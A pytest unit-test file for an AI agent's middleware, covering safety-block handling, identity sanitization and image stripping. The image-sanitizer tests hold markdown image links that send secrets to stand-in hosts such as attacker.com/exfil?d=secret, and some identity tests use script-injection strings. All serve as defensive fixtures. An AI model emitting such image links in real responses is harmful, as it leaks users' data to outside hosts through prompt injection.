"""Unit tests for the middleware builder module."""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from agent.src.agent.config.middleware import ResolvedMiddlewareConfig
from agent.src.infrastructure.middleware import (
    _build_model_fallback,
    _build_summarization_tool_middleware,
    _current_user_info,
    _import_middleware,
    _sanitize_identity_value,
    build_current_datetime_middleware,
    build_excluded_middleware,
    build_middleware_list,
    build_user_identity_middleware,
    get_current_datetime,
    resolve_memory_param,
    set_user_info,
)


class TestBuildMiddlewareList:
    @pytest.fixture(autouse=True)
    def _no_configured_tool_exclusions(self):
        """This class counts middleware composition, not product config."""
        with patch(
            "agent.src.infrastructure.middleware._profile_excluded_tools",
            return_value=[],
        ):
            yield

    """Test middleware instance construction from resolved config."""

    @pytest.fixture(autouse=True)
    def _disable_audit_and_opa(self):
        with (
            patch(
                "agent.src.audit.config.is_audit_enabled",
                return_value=False,
            ),
            patch(
                "agent.src.opa.config.is_opa_enabled",
                return_value=False,
            ),
        ):
            yield

    def test_returns_only_safety_when_master_switch_off(self):
        resolved = ResolvedMiddlewareConfig(summarization_tool_enabled=True)
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = False
            result = build_middleware_list(resolved)
        assert len(result) == 9
        assert type(result[0]).__name__ == "GeminiSafetyLogMiddleware"
        assert type(result[1]).__name__ == "UserIdentityMiddleware"
        assert type(result[2]).__name__ == "AgentConfigMiddleware"
        assert type(result[3]).__name__ == "CurrentDatetimeMiddleware"
        assert type(result[4]).__name__ == "PromptSizeMiddleware"
        assert type(result[5]).__name__ == "McpAuthNoticeMiddleware"
        assert type(result[6]).__name__ == "ImageSanitizeMiddleware"
        assert type(result[7]).__name__ == "NothingToSendMiddleware"
        assert type(result[8]).__name__ == "FreshRunMiddleware"

    def test_includes_summarization_tool_when_enabled(self):
        resolved = ResolvedMiddlewareConfig(summarization_tool_enabled=True)
        mock_mw = MagicMock()
        with (
            patch("agent.src.infrastructure.middleware.settings") as mock_settings,
            patch(
                "agent.src.infrastructure.middleware._build_summarization_tool_middleware",
                return_value=mock_mw,
            ),
        ):
            mock_settings.MIDDLEWARE_ENABLED = True
            result = build_middleware_list(resolved)
        assert mock_mw in result

    def test_excludes_summarization_tool_when_disabled(self):
        resolved = ResolvedMiddlewareConfig(
            summarization_tool_enabled=False, extra_middleware=[]
        )
        with (
            patch("agent.src.infrastructure.middleware.settings") as mock_settings,
            patch(
                "agent.src.infrastructure.middleware._build_summarization_tool_middleware",
            ) as build_sum,
        ):
            mock_settings.MIDDLEWARE_ENABLED = True
            result = build_middleware_list(resolved)
            build_sum.assert_not_called()
        assert not any("Summariz" in type(m).__name__ for m in result)
        assert result

    def test_includes_extra_middleware(self):
        resolved = ResolvedMiddlewareConfig(
            summarization_tool_enabled=False,
            extra_middleware=[
                "tests.unit.test_infrastructure_middleware:_DummyMiddleware"
            ],
        )
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = build_middleware_list(resolved)
        assert any(isinstance(m, _DummyMiddleware) for m in result)


class TestBuildExcludedMiddleware:
    """Test excluded middleware list generation."""

    def test_empty_when_all_enabled(self):
        resolved = ResolvedMiddlewareConfig(
            patch_tool_calls_enabled=True, excluded_middleware=[]
        )
        result = build_excluded_middleware(resolved)
        assert result == []

    def test_includes_patch_tool_calls_when_disabled(self):
        resolved = ResolvedMiddlewareConfig(
            patch_tool_calls_enabled=False, excluded_middleware=[]
        )
        result = build_excluded_middleware(resolved)
        assert "PatchToolCallsMiddleware" in result

    def test_preserves_profile_exclusions(self):
        resolved = ResolvedMiddlewareConfig(
            patch_tool_calls_enabled=True,
            excluded_middleware=["SomeCustomMiddleware"],
        )
        result = build_excluded_middleware(resolved)
        assert "SomeCustomMiddleware" in result


class TestResolveMemoryParam:
    """Test memory parameter resolution for create_deep_agent()."""

    def test_returns_none_when_master_disabled(self):
        resolved = ResolvedMiddlewareConfig(memory_enabled=True)
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = False
            result = resolve_memory_param(resolved)
        assert result is None

    def test_returns_none_when_memory_disabled(self):
        resolved = ResolvedMiddlewareConfig(memory_enabled=False)
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = resolve_memory_param(resolved)
        assert result is None

    def test_returns_namespaces_when_enabled(self):
        resolved = ResolvedMiddlewareConfig(
            memory_enabled=True, memory_namespaces=["user_mem", "shared"]
        )
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = resolve_memory_param(resolved)
        assert result == ["user_mem", "shared"]

    def test_stock_memories_maps_to_user_profile(self):
        resolved = ResolvedMiddlewareConfig(
            memory_enabled=True, memory_namespaces=["memories"]
        )
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = resolve_memory_param(resolved)
        assert result == ["/memories/user_profile.md"]


class TestImportMiddleware:
    """Test dynamic middleware importing."""

    def test_invalid_path_without_colon(self):
        result = _import_middleware("no_colon_here")
        assert result is None

    def test_nonexistent_module(self):
        result = _import_middleware("nonexistent.module:Class")
        assert result is None

    def test_valid_import(self):
        result = _import_middleware(
            "tests.unit.test_infrastructure_middleware:_DummyMiddleware"
        )
        assert result is not None


class TestGeminiSafetyLogMiddleware:
    """Test the GeminiSafetyLogMiddleware after_model hook."""

    def _build_middleware(self):
        from agent.src.infrastructure.middleware import (
            _build_gemini_safety_log_middleware,
        )

        return _build_gemini_safety_log_middleware()

    def test_returns_none_for_normal_message(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [AIMessage(content="Hello!", id="msg1")]}
        assert mw.after_model(state, None) is None

    @pytest.mark.parametrize(
        "finish_reason",
        [
            "SAFETY",
            "RECITATION",
            "BLOCKLIST",
            "PROHIBITED_CONTENT",
            "IMAGE_SAFETY",
            "SPII",
            "refusal",
        ],
    )
    def test_replaces_candidate_level_safety_blocked_message(self, finish_reason):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={"finish_reason": finish_reason, "safety_ratings": []},
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        replaced = result["messages"][-1]
        assert "content safety filter" in replaced.content
        assert replaced.id == "msg1"

    def test_replaces_anthropic_refusal_via_stop_reason(self):
        """ChatAnthropicVertex sets stop_reason, not finish_reason."""
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={"stop_reason": "refusal", "stop_sequence": None},
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        assert "content safety filter" in result["messages"][-1].content

    def test_ignores_non_safety_empty_message(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        msg = AIMessage(
            content="",
            id="msg1",
            response_metadata={"finish_reason": "stop"},
        )
        state = {"messages": [msg]}
        assert mw.after_model(state, None) is None

    def test_ignores_non_ai_message(self):
        from langchain_core.messages import HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [HumanMessage(content="hi")]}
        assert mw.after_model(state, None) is None

    def test_replaces_prompt_level_safety_block(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={
                "prompt_feedback": {
                    "block_reason": "SAFETY",
                    "safety_ratings": [{"category": "HARM_CATEGORY_DANGEROUS_CONTENT"}],
                }
            },
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        replaced = result["messages"][-1]
        assert "content safety filter" in replaced.content
        assert replaced.id == "msg1"

    @pytest.mark.parametrize(
        "block_reason",
        ["BLOCKLIST", "PROHIBITED_CONTENT", "JAILBREAK", "IMAGE_SAFETY", "MODEL_ARMOR"],
    )
    def test_replaces_prompt_level_block_reasons(self, block_reason):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={
                "prompt_feedback": {"block_reason": block_reason, "safety_ratings": []}
            },
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        assert "content safety filter" in result["messages"][-1].content

    def test_ignores_prompt_feedback_with_unspecified_block_reason(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        msg = AIMessage(
            content="",
            id="msg1",
            response_metadata={
                "prompt_feedback": {"block_reason": 0, "safety_ratings": []}
            },
        )
        state = {"messages": [msg]}
        assert mw.after_model(state, None) is None


class TestSanitizeIdentityValue:
    """Test _sanitize_identity_value strips dangerous characters."""

    def test_normal_value_unchanged(self):
        assert _sanitize_identity_value("alice@example.com") == "alice@example.com"

    def test_strips_control_characters(self):
        assert _sanitize_identity_value("alice\x00bob") == "alicebob"
        assert _sanitize_identity_value("line\nnewline") == "linenewline"
        assert _sanitize_identity_value("tab\there") == "tabhere"
        assert _sanitize_identity_value("\x7fDEL") == "DEL"

    def test_strips_delimiter_characters(self):
        assert (
            _sanitize_identity_value("<script>alert</script>") == "scriptalert/script"
        )
        assert _sanitize_identity_value("user[admin]") == "useradmin"

    def test_strips_whitespace(self):
        assert _sanitize_identity_value("  padded  ") == "padded"

    def test_empty_string(self):
        assert _sanitize_identity_value("") == ""

    def test_combined_control_and_delimiter(self):
        assert _sanitize_identity_value("\n<injected>\x00") == "injected"

    def test_strips_unicode_line_separators(self):
        assert _sanitize_identity_value("alice\u2028bob") == "alicebob"
        assert _sanitize_identity_value("alice\u2029bob") == "alicebob"


class TestSetUserInfo:
    """Test set_user_info stores sanitized identity in ContextVar."""

    def teardown_method(self):
        _current_user_info.set(None)

    def test_stores_sanitized_values(self):
        set_user_info(user_id="u1", display_name="Alice", email="a@b.com")
        info = _current_user_info.get()
        assert info == {"user_id": "u1", "display_name": "Alice", "email": "a@b.com"}

    def test_filters_none_values(self):
        set_user_info(user_id="u1", display_name=None, email=None)
        info = _current_user_info.get()
        assert info == {"user_id": "u1"}

    def test_all_none_sets_none(self):
        set_user_info(user_id=None, display_name=None, email=None)
        assert _current_user_info.get() is None

    def test_sanitizes_at_storage_time(self):
        set_user_info(user_id="u<1>", display_name="A\nB", email="a@b.com")
        info = _current_user_info.get()
        assert info["user_id"] == "u1"
        assert info["display_name"] == "AB"


class TestUserIdentityMiddleware:
    """Test build_user_identity_middleware and its injection logic."""

    def teardown_method(self):
        _current_user_info.set(None)

    def test_returns_middleware_instance(self):
        mw = build_user_identity_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        assert type(mw).__name__ == "UserIdentityMiddleware"

    def test_inject_identity_with_no_user_info(self):
        mw = build_user_identity_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        request = MagicMock()
        result = mw._inject_identity(request)
        assert result is request
        request.override.assert_not_called()

    def test_inject_identity_with_user_info(self):
        mw = build_user_identity_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        set_user_info(user_id="u1", display_name="Alice", email="a@b.com")
        request = MagicMock()
        request.system_message = MagicMock()
        with patch(
            "deepagents.middleware.subagents.append_to_system_message"
        ) as mock_append:
            appended_msg = MagicMock()
            mock_append.return_value = appended_msg
            result = mw._inject_identity(request)
        mock_append.assert_called_once()
        block_arg = mock_append.call_args[0][1]
        assert "<authenticated-user>" in block_arg
        assert "</authenticated-user>" in block_arg
        assert "user_id: u1" in block_arg
        assert "display_name: Alice" in block_arg
        assert "email: a@b.com" in block_arg
        request.override.assert_called_once_with(system_message=appended_msg)
        assert result is request.override.return_value

    def test_wrap_model_call_delegates(self):
        mw = build_user_identity_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        handler = MagicMock()
        request = MagicMock()
        mw.wrap_model_call(request, handler)
        handler.assert_called_once()

    @pytest.mark.asyncio
    async def test_awrap_model_call_delegates(self):
        mw = build_user_identity_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        handler = AsyncMock()
        request = MagicMock()
        await mw.awrap_model_call(request, handler)
        handler.assert_called_once()


class TestGetCurrentDatetime:
    """Test get_current_datetime returns a properly formatted UTC string."""

    def test_returns_string_with_utc_suffix(self):
        result = get_current_datetime()
        assert result.endswith(" UTC")

    def test_format_matches_expected_pattern(self):
        result = get_current_datetime()
        import re

        assert re.match(r"^[A-Z][a-z]+ \d{1,2}, \d{4}, \d{2}:\d{2}:\d{2} UTC$", result)

    def test_uses_utc_not_local(self):
        from datetime import datetime, timezone

        utc_now = datetime.now(timezone.utc)
        result = get_current_datetime()
        expected_date = utc_now.strftime("%B %d, %Y")
        assert expected_date in result

    def test_is_rounded_so_the_prompt_prefix_can_be_cached(self):
        """This block heads the prefix a provider caches."""
        from unittest.mock import patch

        from agent.src.settings import settings

        with patch.object(settings, "DATETIME_PROMPT_GRANULARITY_SECONDS", 3600):
            assert get_current_datetime().endswith(":00:00 UTC")

    def test_granularity_of_one_restores_per_second_precision(self):
        from unittest.mock import patch

        from agent.src.settings import settings

        with patch.object(settings, "DATETIME_PROMPT_GRANULARITY_SECONDS", 1):
            from datetime import datetime, timezone

            now = datetime.now(timezone.utc).strftime("%H:%M:%S")
            assert now in get_current_datetime()

    def test_is_stable_across_calls_within_one_window(self):
        """Two calls a second apart must produce the same string."""
        from unittest.mock import patch

        from agent.src.settings import settings

        with patch.object(settings, "DATETIME_PROMPT_GRANULARITY_SECONDS", 3600):
            assert get_current_datetime() == get_current_datetime()


class TestCurrentDatetimeMiddleware:
    """Test build_current_datetime_middleware and its injection logic."""

    def test_returns_middleware_instance(self):
        mw = build_current_datetime_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        assert type(mw).__name__ == "CurrentDatetimeMiddleware"

    def test_always_injects(self):
        mw = build_current_datetime_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        request = MagicMock()
        request.system_message = MagicMock()
        with patch(
            "deepagents.middleware.subagents.append_to_system_message"
        ) as mock_append:
            appended_msg = MagicMock()
            mock_append.return_value = appended_msg
            result = mw._inject_current_datetime(request)
        mock_append.assert_called_once()
        block_arg = mock_append.call_args[0][1]
        assert "<current-datetime>" in block_arg
        assert "</current-datetime>" in block_arg
        assert "UTC" in block_arg
        request.override.assert_called_once_with(system_message=appended_msg)
        assert result is request.override.return_value

    def test_wrap_model_call_delegates(self):
        mw = build_current_datetime_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        handler = MagicMock()
        request = MagicMock()
        mw.wrap_model_call(request, handler)
        handler.assert_called_once()

    @pytest.mark.asyncio
    async def test_awrap_model_call_delegates(self):
        mw = build_current_datetime_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        handler = AsyncMock()
        request = MagicMock()
        await mw.awrap_model_call(request, handler)
        handler.assert_called_once()


class TestImageSanitizeMiddleware:
    """Test the ImageSanitizeMiddleware before_model and after_model hooks."""

    def _build_middleware(self):
        from agent.src.infrastructure.middleware import (
            _build_image_sanitize_middleware,
        )

        return _build_image_sanitize_middleware()

    def test_strips_image_tag_from_ai_response(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="Here ![test](https://attacker.com/?d=secret)", id="msg1"
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "Here test"
        assert result["messages"][-1].id == "msg1"

    def test_strips_empty_alt_image_tag(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="Data ![](https://attacker.com/?d=secret) here", id="msg1"
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "Data  here"

    def test_strips_multiple_image_tags(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="![a](https://evil.com/1) and ![b](https://evil.com/2)",
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "a and b"

    def test_ignores_normal_ai_message(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [AIMessage(content="Hello, no images here!", id="msg1")]}
        assert mw.after_model(state, None) is None

    def test_ignores_markdown_links(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(content="Click [here](https://example.com)", id="msg1")
            ]
        }
        assert mw.after_model(state, None) is None

    def test_strips_image_tag_from_user_input(self):
        from langchain_core.messages import HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                HumanMessage(
                    content="![img](https://attacker.com/steal?d=secret)", id="msg1"
                )
            ]
        }
        result = mw.before_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "img"
        assert result["messages"][-1].id == "msg1"

    def test_ignores_normal_user_message(self):
        from langchain_core.messages import HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [HumanMessage(content="What is my BMI?", id="msg1")]}
        assert mw.before_model(state, None) is None

    def test_ignores_empty_state(self):
        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        assert mw.before_model({"messages": []}, None) is None
        assert mw.after_model({"messages": []}, None) is None

    def test_strips_protocol_relative_url(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [AIMessage(content="![logo](//attacker.com/steal)", id="msg1")]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "logo"

    def test_strips_nested_image_tags(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="![![inner](https://decoy.com)](https://attacker.com/steal)",
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert "attacker" not in result["messages"][-1].content
        assert "![" not in result["messages"][-1].content

    def test_strips_image_from_tool_message(self):
        from langchain_core.messages import ToolMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                ToolMessage(
                    content="Result: ![chart](https://attacker.com/exfil?d=secret)",
                    tool_call_id="tc1",
                )
            ]
        }
        result = mw.before_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "Result: chart"

    def test_sanitizes_all_human_messages(self):
        from langchain_core.messages import AIMessage, HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                HumanMessage(content="![old](https://evil.com/1)", id="m1"),
                AIMessage(content="Sure", id="m2"),
                HumanMessage(content="![new](https://evil.com/2)", id="m3"),
            ]
        }
        result = mw.before_model(state, None)
        assert result is not None
        assert result["messages"][0].content == "old"
        assert result["messages"][2].content == "new"

    def test_ignores_clean_tool_message(self):
        from langchain_core.messages import ToolMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [ToolMessage(content="BMI is 25.7", tool_call_id="tc1")]}
        assert mw.before_model(state, None) is None

    def test_strips_reference_style_image(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="![a][ref]\n\n[ref]: https://attacker.example/x",
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        sanitized = result["messages"][-1].content
        assert "attacker" not in sanitized
        assert "![a]" not in sanitized
        assert "[ref]:" not in sanitized.lower()

    def test_handles_list_content_blocks(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content=[
                        {"type": "text", "text": "![a](https://attacker.example/x)"}
                    ],
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == [{"type": "text", "text": "a"}]

    def test_handles_string_elements_in_content_list(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content=["![x](https://attacker.example/x)"],
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == ["x"]

    def test_preserves_link_reference_definitions(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        content = "See [docs][ref] for details.\n\n[ref]: https://example.com/docs"
        state = {"messages": [AIMessage(content=content, id="msg1")]}
        assert mw.after_model(state, None) is None

    def test_preserves_tool_calls(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        msg = AIMessage(
            content="![x](https://evil.com/steal)",
            id="msg1",
            tool_calls=[{"name": "calculate_bmi", "args": {"h": 172}, "id": "tc1"}],
        )
        state = {"messages": [msg]}
        result = mw.after_model(state, None)
        assert result is not None
        replaced = result["messages"][-1]
        assert replaced.content == "x"
        assert len(replaced.tool_calls) == 1
        assert replaced.tool_calls[0]["name"] == "calculate_bmi"
        assert replaced.tool_calls[0]["args"] == {"h": 172}
        assert replaced.tool_calls[0]["id"] == "tc1"


class _DummyMiddleware:
    """Test fixture — a no-op middleware class."""

    pass


class TestBuildModelFallbackEdgeCases:
    """Test edge cases for _build_model_fallback."""

    def test_exception_in_init_returns_none(self):
        with patch(
            "langchain.agents.middleware.ModelFallbackMiddleware",
            side_effect=Exception("model init failed"),
        ):
            result = _build_model_fallback("some-model")
        assert result is None


class TestCompactionThresholdsAreConfiguration:
    """How full the window gets before summarising, and how much of"""

    @staticmethod
    def _build(config):
        from agent.src.infrastructure.middleware import (
            _build_configured_compaction,
        )

        with patch(
            "langchain.agents.middleware.summarization.SummarizationMiddleware"
        ) as made:
            _build_configured_compaction(
                model=MagicMock(), backend=MagicMock(), config=config
            )
        return made

    def test_a_deployment_that_says_nothing_builds_nothing(self):
        from agent.src.agent.config.middleware import CompactionConfig
        from agent.src.infrastructure.middleware import (
            _build_configured_compaction,
        )

        built = _build_configured_compaction(
            model=MagicMock(), backend=MagicMock(), config=CompactionConfig()
        )
        assert built is None

    def test_the_configured_fraction_is_what_fires_it(self):
        from agent.src.agent.config.middleware import CompactionConfig

        made = self._build(CompactionConfig(trigger_fraction=0.6))
        assert made.call_args.kwargs["trigger"] == ("fraction", 0.6)

    def test_the_configured_tail_is_what_survives(self):
        from agent.src.agent.config.middleware import CompactionConfig

        made = self._build(CompactionConfig(keep_messages=40))
        assert made.call_args.kwargs["keep"] == ("messages", 40)

    def test_what_was_not_said_is_left_to_the_runtime(self):
        from agent.src.agent.config.middleware import CompactionConfig

        made = self._build(CompactionConfig(trigger_fraction=0.6))
        assert "keep" not in made.call_args.kwargs

    def test_it_replaces_the_one_the_runtime_would_have_added(self):
        from agent.src.agent.config.middleware import CompactionConfig
        from agent.src.infrastructure.middleware import (
            _build_configured_compaction,
        )

        built = _build_configured_compaction(
            model=MagicMock(),
            backend=MagicMock(),
            config=CompactionConfig(keep_messages=40),
        )
        assert built is not None
        assert getattr(built, "name", "") == "SummarizationMiddleware"

    def test_a_fraction_of_a_window_nobody_knows_is_refused(self):
        from agent.src.agent.config.middleware import CompactionConfig
        from agent.src.infrastructure.middleware import (
            CompactionUnavailable,
            _build_configured_compaction,
        )

        with pytest.raises(CompactionUnavailable, match="token"):
            _build_configured_compaction(
                model=MagicMock(),
                backend=MagicMock(),
                config=CompactionConfig(trigger_fraction=0.6),
            )

    def test_a_build_that_fails_is_a_failure_not_a_silence(self):
        from agent.src.agent.config.middleware import CompactionConfig
        from agent.src.infrastructure.middleware import (
            CompactionUnavailable,
            _build_configured_compaction,
        )

        with patch(
            "langchain.agents.middleware.summarization.SummarizationMiddleware",
            side_effect=Exception("no"),
        ):
            with pytest.raises(CompactionUnavailable):
                _build_configured_compaction(
                    model=MagicMock(),
                    backend=MagicMock(),
                    config=CompactionConfig(trigger_fraction=0.6),
                )


class TestCompactionThatCouldNotBeBuilt:
    """Asked for and not built is a failure, not a quiet absence."""

    def test_no_model_to_summarise_with_is_a_failure(self):
        from agent.src.infrastructure.middleware import CompactionUnavailable

        with pytest.raises(CompactionUnavailable):
            _build_summarization_tool_middleware(model=None, backend=MagicMock())

    def test_nowhere_to_put_a_summary_is_a_failure(self):
        from agent.src.infrastructure.middleware import CompactionUnavailable

        with pytest.raises(CompactionUnavailable):
            _build_summarization_tool_middleware(model=MagicMock(), backend=None)

    def test_a_build_that_throws_is_a_failure(self):
        from agent.src.infrastructure.middleware import CompactionUnavailable

        with patch(
            "deepagents.middleware.summarization.create_summarization_tool_middleware",
            side_effect=Exception("creation error"),
        ):
            with pytest.raises(CompactionUnavailable):
                _build_summarization_tool_middleware(
                    model=MagicMock(), backend=MagicMock()
                )

    def test_the_failure_says_what_is_missing(self):
        from agent.src.infrastructure.middleware import CompactionUnavailable

        with pytest.raises(CompactionUnavailable) as error:
            _build_summarization_tool_middleware(model=None, backend=MagicMock())
        assert "model" in str(error.value).lower()

    def test_a_build_that_works_is_returned(self):
        made = MagicMock()
        with patch(
            "deepagents.middleware.summarization.create_summarization_tool_middleware",
            return_value=made,
        ):
            built = _build_summarization_tool_middleware(
                model=MagicMock(), backend=MagicMock()
            )
        assert built is made


class TestExclusionSources:
    """Two reasons to remove a tool; only one is about the model."""

    def test_enforcement_takes_both_sources(self):
        from agent.src.infrastructure import middleware as mw

        profile = MagicMock()
        profile.excluded_tools = ["model_cannot_use_this"]
        providers = MagicMock()
        providers.harness_profiles = {"some-model": profile}

        resolved = MagicMock()
        resolved.tool_exclusion.enabled = True
        resolved.tool_exclusion.tools = ["removed_by_design"]

        with (
            patch.object(mw, "logger", MagicMock()),
            patch(
                "agent.src.agent.config.agent_config.get_providers_config",
                return_value=providers,
            ),
            patch(
                "agent.src.agent.config.agent_config.resolve_agent_middleware",
                return_value=resolved,
            ),
        ):
            names = mw._profile_excluded_tools("some-model")

        assert names == ["model_cannot_use_this", "removed_by_design"]

    def test_another_model_keeps_the_tool(self):
        """A profile is per model, so its exclusions are too."""
        from agent.src.infrastructure import middleware as mw

        profile = MagicMock()
        profile.excluded_tools = ["model_cannot_use_this"]
        providers = MagicMock()
        providers.harness_profiles = {"some-model": profile}

        resolved = MagicMock()
        resolved.tool_exclusion.enabled = True
        resolved.tool_exclusion.tools = ["removed_by_design"]

        with (
            patch.object(mw, "logger", MagicMock()),
            patch(
                "agent.src.agent.config.agent_config.get_providers_config",
                return_value=providers,
            ),
            patch(
                "agent.src.agent.config.agent_config.resolve_agent_middleware",
                return_value=resolved,
            ),
        ):
            names = mw._profile_excluded_tools("a-different-model")

        assert names == ["removed_by_design"]

    def test_a_disabled_exclusion_block_removes_nothing(self):
        from agent.src.infrastructure import middleware as mw

        providers = MagicMock()
        providers.harness_profiles = {}
        resolved = MagicMock()
        resolved.tool_exclusion.enabled = False
        resolved.tool_exclusion.tools = ["removed_by_design"]

        with (
            patch(
                "agent.src.agent.config.agent_config.get_providers_config",
                return_value=providers,
            ),
            patch(
                "agent.src.agent.config.agent_config.resolve_agent_middleware",
                return_value=resolved,
            ),
        ):
            assert mw._profile_excluded_tools() == []


class TestShortlistingJoinsTheStack:
    """Only when a deployment asked for it."""

    @staticmethod
    def _built(strategy):
        from agent.src.agent.config.middleware import (
            ResolvedMiddlewareConfig,
            ToolShortlistConfig,
        )
        from agent.src.infrastructure.middleware import build_middleware_list

        resolved = ResolvedMiddlewareConfig(
            summarization_tool_enabled=False,
            extra_middleware=[],
            tool_shortlist=ToolShortlistConfig(strategy=strategy),
        )
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            return build_middleware_list(resolved)

    def test_nothing_is_added_by_default(self):
        names = [type(m).__name__ for m in self._built("none")]
        assert "ToolShortlistMiddleware" not in names

    def test_asking_for_it_puts_it_in_the_stack(self):
        names = [type(m).__name__ for m in self._built("static")]
        assert "ToolShortlistMiddleware" in names

    def test_it_knows_which_servers_the_agent_declared(self):
        found = [
            m
            for m in self._built("static")
            if type(m).__name__ == "ToolShortlistMiddleware"
        ]
        assert found and found[0]._known is not None


class TestBlockBudgetJoinsTheStack:
    """Only when a deployment set a per-block ceiling."""

    @staticmethod
    def _built(per_block, per_thread=0):
        from agent.src.agent.config.middleware import (
            ResolvedMiddlewareConfig,
            ToolCallLimitConfig,
        )
        from agent.src.infrastructure.middleware import build_middleware_list

        resolved = ResolvedMiddlewareConfig(
            summarization_tool_enabled=False,
            extra_middleware=[],
            tool_call_limit=ToolCallLimitConfig(
                per_block=per_block, per_thread=per_thread
            ),
        )
        with patch("agent.src.infrastructure.middleware.settings") as mock_settings:
